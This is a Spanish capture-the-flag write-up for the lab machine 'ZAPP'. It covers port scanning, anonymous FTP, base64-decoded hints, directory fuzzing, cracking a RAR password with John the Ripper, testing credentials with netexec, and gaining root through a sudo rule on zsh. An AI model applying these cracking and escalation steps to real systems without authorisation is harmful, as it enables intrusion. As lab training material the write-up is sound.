---
title: "ZAPP - TheHackerLabs"
date: 2026-05-05
draft: false
slug: "THL-writeup-zapp"
excerpt: "Esta fue una máquina sencilla. Después de analizar los servicios activos, comenzamos enumerando el servicio FTP, donde encontramos 2 archivos de texto con posibles pistas para ganar acceso a la máquina. Después nos pasamos a la página web activa en el puerto 80, que al analizar su código fuente, encontramos una cadena de texto en base64, que decodificamos y nos da una posible pista. Aplicamos Fuzzing para ver si encontramos algo de utilidad, pero solo encontramos archivos y directorios que no nos llevan a nada. Al usar la pista que decodificamos como una ruta para la página web, encontramos un archivo comprimido RAR que logramos crackear con JohnTheRipper. El archivo comprimido nos da un archivo de texto que contiene una contraseña. Utilizamos netexec para probar probables usuarios y la contraseña que encontramos, siendo así que logramos ubicar un usuario válido y ganamos acceso a la máquina víctima vía SSH. Dentro, vemos que nuestro usuario puede usar el binario zsh como Root, así que utilizamos la guía de GTFOBins para encontrar una forma de escalar privilegios, siendo así que nos convertimos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "FTP", "SSH", "FTP Enumeration", "Web Enumeration", "Fuzzing", "Source Code Analysis", "Base64 Decoding", "Cracking Hash", "Cracking RAR File", "Abusing Sudoers Privilege On zsh Binary", "Privesc - Abusing Sudoers Privilege On zsh Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "wappalizer"
  - "CyberChef"
  - "echo"
  - "base64"
  - "ffuf"
  - "gobuster"
  - "unrar"
  - "rar2john"
  - "JohnTheRipper"
  - "nxc"
  - "ssh"
  - "sudo"
  - "GTFOBins"
  - "zsh"
links:
  - "https://gchq.github.io/CyberChef/"
  - "https://gtfobins.org/gtfobins/zsh/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-zapp/ZAPP.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.250
PING 192.168.100.250 (192.168.100.250) 56(84) bytes of data.
64 bytes from 192.168.100.250: icmp_seq=1 ttl=64 time=2.09 ms
64 bytes from 192.168.100.250: icmp_seq=2 ttl=64 time=0.860 ms
64 bytes from 192.168.100.250: icmp_seq=3 ttl=64 time=0.831 ms
64 bytes from 192.168.100.250: icmp_seq=4 ttl=64 time=1.02 ms

--- 192.168.100.250 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 0.831/1.198/2.089/0.518 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.250 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-04 17:58 -0600
Initiating ARP Ping Scan at 17:58
Scanning 192.168.100.250 [1 port]
Completed ARP Ping Scan at 17:58, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:58
Scanning 192.168.100.250 [65535 ports]
Discovered open port 21/tcp on 192.168.100.250
Discovered open port 22/tcp on 192.168.100.250
Discovered open port 80/tcp on 192.168.100.250
Completed SYN Stealth Scan at 17:58, 18.87s elapsed (65535 total ports)
Nmap scan report for 192.168.100.250
Host is up, received arp-response (0.00084s latency).
Scanned at 2026-05-04 17:58:16 CST for 19s
Not shown: 36926 closed tcp ports (reset), 28606 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds
           Raw packets sent: 101848 (4.481MB) | Rcvd: 36934 (1.477MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Tenemos 3 puertos abiertos, pero me da curiosidad ver el **puerto 21** activo.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80 192.168.100.250 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-04 18:02 -0600
Nmap scan report for 192.168.100.250
Host is up (0.00086s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later

| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              28 Oct 29  2025 login.txt
|_-rw-r--r--    1 0        0              65 Oct 29  2025 secret.txt
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)

| ssh-hostkey: 
|   3072 a3:23:b3:aa:df:c6:51:cb:a2:0c:92:8e:6b:fe:96:ee (RSA)
|   256 fd:95:2f:2f:7f:5a:21:b5:0e:75:2c:da:18:c9:52:35 (ECDSA)
|_  256 a1:0e:0d:79:8e:54:3e:0e:ed:2f:96:d6:d3:9a:9f:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))

|_http-title: zappskred - CTF Challenge
|_http-server-header: Apache/2.4.65 (Debian)
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tenemos muy buena información de este escaneo:
* El **servicio FTP** permite autenticarnos como el **usuario anonymous** y también podemos ver que existen 2 archivos de texto.
* La página web activa en el **puerto 80** no muestra que esté usando un dominio.
* La versión del **servicio SSH** es un poco vieja, pero no hay una vulnerabilidad que podamos usar con esta versión.

Empecemos con la enumeración del **servicio FTP** y luego con la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio FTP {#FTP}

Entremos al **FTP** como el **usuario anonymous**:
```bash
ftp 192.168.100.250
Connected to 192.168.100.250.
220 Welcome zappskred.
Name (192.168.100.21:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Listemos los archivos existentes:
```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||36673|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        109          4096 Oct 29  2025 .
drwxr-xr-x    2 0        109          4096 Oct 29  2025 ..
-rw-r--r--    1 0        0              28 Oct 29  2025 login.txt
-rw-r--r--    1 0        0              65 Oct 29  2025 secret.txt
226 Directory send OK.
```
Solamente hay 2 archivos de texto.

Descarguémoslos:
```bash
ftp> get login.txt
ftp> get secret.txt
```

Y veamos su contenido:
```bash
cat login.txt
puerto
4444
coffee
GoodLuck

cat secret.txt
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```
Para el caso del archivo login.txt, puede que sea una pista sobre un puerto oculto o un usuario y contraseña.

Con el segundo archivo, parece ser un mensaje escrito con lenguaje **Leet Speak 1337**, que a simple vista se puede entender lo que dice, pero si lo quieres ver mejor, se puede decodificar con **CyberChef**.

Te dejo el link de **CyberChef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Dentro, solo busca **Leet Speak** y escoge la opción para decodificarlo:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura1.png">
</p>

Quizá sea una pista lo de la taza, pero es todo lo que podemos encontrar.

Vayamos a la página web.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura2.png">
</p>

Solo podemos ver una imagen y parece tener un mensaje en el centro que dice `problem?`.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura3.png">
</p>

No hay mucho que destacar.

Revisando el código fuente, encontraremos una cadena en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura4.png">
</p>

Podemos decodificarla usando el comando **base64**, pero tendremos que hacerlo hasta 4 veces para ver el resultado correcto:
```bash
echo -n "VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=" | base64 -d | base64 -d | base64 -d | base64 -d
cuatrocuatroveces
```
Quizá sea una contraseña, pero podemos ver la recurrencia en mencionar el número 4.

Apliquemos **Fuzzing** para descubrir directorios o archivos ocultos.

### Fuzzing {#fuzz}

Primero usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://192.168.100.250/FUZZ -t 300 -mc 200,301 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.250/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301
________________________________________________

index.html              [Status: 200, Size: 6570, Words: 2670, Lines: 238, Duration: 31ms]
index.html              [Status: 200, Size: 6570, Words: 2670, Lines: 238, Duration: 48ms]
pass.txt                [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 6ms]
.                       [Status: 200, Size: 6570, Words: 2670, Lines: 238, Duration: 58ms]
waterloo                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 62ms]
dorset                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 53ms]
:: Progress: [513480/513480] :: Job [1/1] :: 3048 req/sec :: Duration: [0:02:19] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*	     | Para indicar la cantidad de hilos a usar. |
| *-mc*	     | Para aplicar un filtro que solo muestre resultados con un código de estado específico. |
| *-e*	     | Para específicar la extensión de un archivo a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.250 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 300 -x php,txt,html -s 200,301 -b "" --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://192.168.100.250
[+] Method:         GET
[+] Threads:        300
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 6570]
index.html           (Status: 200) [Size: 6570]
pass.txt             (Status: 200) [Size: 1]
.                    (Status: 200) [Size: 6570]
waterloo             (Status: 301) [Size: 319] [--> http://192.168.100.250/waterloo/]
dorset               (Status: 301) [Size: 317] [--> http://192.168.100.250/dorset/]
Progress: 513480 / 513480 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |
| *-x*	     | Para específicar la extensión de un archivo a buscar. |

Comencemos revisando ese archivo de texto que se llama **pass.txt**, pero verás que no contiene nada:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura5.png">
</p>

Entrando a la ruta `/waterloo`, encontraremos un archivo **info.php**:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura6.png">
</p>

Si entramos en este, encontraremos un mensaje, pero nada más:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura7.png">
</p>

Entrando a la ruta `/dorset` podremos ver algunos directorios, pero estos no contienen nada:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura8.png">
</p>

Viendo el archivo de texto, solamente tiene un mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura9.png">
</p>

Parece que caímos en un **Rabbit Hole**, entonces debemos seguir buscando.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeando Archivo Comprimido RAR y Ganando Acceso a la Máquina Víctima Vía SSH {#Cracking}

Utilizando la cadena en **base64** decodificada como una ruta de la página web, encontraremos un archivo comprimido **RAR**:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura10.png">
</p>

Al intentar descomprimirlo con **unrar**, nos pedirá una contraseña:
```bash
unrar x Sup3rP4ss.rar

UNRAR 7.20 beta 3 freeware      Copyright (c) 1993-2025 Alexander Roshal

Extracting from Sup3rP4ss.rar

Enter password (will not be echoed) for Sup3rP4ss.txt
```

Podemos crackear este archivo con **JohnTheRipper**, pero primero debemos obtener el Hash del archivo en un formato que acepte **John**. Para esto usaremos **rar2john**:
```bash
rar2john Sup3rP4ss.rar > hashRar
```

Ahora lo crackeamos y usamos el wordlist **rockyou.txt** como lista de contraseñas a probar:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashRar
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
reema            (Sup3rP4ss.rar)     
1g 0:00:01:07 DONE (2026-05-04 18:38) 0.01475g/s 1246p/s 1246c/s 1246C/s sanramon..precious5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Al descomprimirlo, nos dará un archivo de texto que parece tener una contraseña:
```bash
cat Sup3rP4ss.txt
Intenta probar con más >> **********
```
Pero aún no tenemos un usuario.

Probando varias opciones, resulta que el nombre de la página web es un usuario de la máquina víctima, que descubrimos al utilizarlo con **netexec**:
```bash
nxc ftp 192.168.100.250 -u 'zappskred' -p '**********'
FTP         192.168.100.250  21     192.168.100.250   [+] zappskred:**********
```
Esto sirve para **FTP**.

Entonces, debe servir para el **SSH**:
```bash
nxc ssh 192.168.100.250 -u 'zappskred' -p '**********'
SSH         192.168.100.250  22     192.168.100.250   [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u5
SSH         192.168.100.250  22     192.168.100.250   [+] zappskred:**********  Linux - Shell access!
```

Entremos a la máquina víctima vía **SSH**:
```bash
ssh zappskred@192.168.100.250
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
    ███████╗ █████╗ ██████╗ ██████╗ 
 ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
   ███╔╝ ███████║██████╔╝██████╔╝
  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝ 
 ███████╗██║  ██║██║     ██║     
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     

zappskred@192.168.100.250's password: 
Linux TheHackersLabs-ZAPP 5.10.0-36-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64

Last login: Sat Nov  1 03:15:28 2025
ZAPP
+)Creador: puerto4444
+)Nombre: ZAPP
+)IP: 192.168.100.250
----------------------------------------
zappskred@TheHackersLabs-ZAPP:~$ whoami
zappskred
```
Estamos dentro.

Busquemos la flag del usuario:
```bash
zappskred@TheHackersLabs-ZAPP:~$ ls
user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Abusando de Permisos Sudoers sobre Binario zsh para Escalar Privilegios {#zsh}

Veamos qué privilegios tiene nuestro usuario:
```bash
zappskred@TheHackersLabs-ZAPP:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-ZAPP: No address associated with hostname
[sudo] password for zappskred: 
Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh
```
Perfecto, podemos utilizar el binario **zsh** para escalar privilegios.

Utilizaremos la **guía de GTFOBins** para buscar una forma de escalar:
* <a href="https://gtfobins.org/gtfobins/zsh/" target="_blank">GTFOBins: zsh</a>

Usaremos lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-zapp/Captura11.png">
</p>

Simplemente utilizamos **zsh** con privilegios:
```bash
zappskred@TheHackersLabs-ZAPP:~$ sudo zsh
sudo: unable to resolve host TheHackersLabs-ZAPP: No address associated with hostname
TheHackersLabs-ZAPP# 
TheHackersLabs-ZAPP# whoami
root
```
Somos **Root**.

Ya solo busquemos la última flag:
```bash
TheHackersLabs-ZAPP# cd /root
TheHackersLabs-ZAPP# ls
root.txt
TheHackersLabs-ZAPP# cat root.txt
...
```
Y con esto, terminamos la máquina.
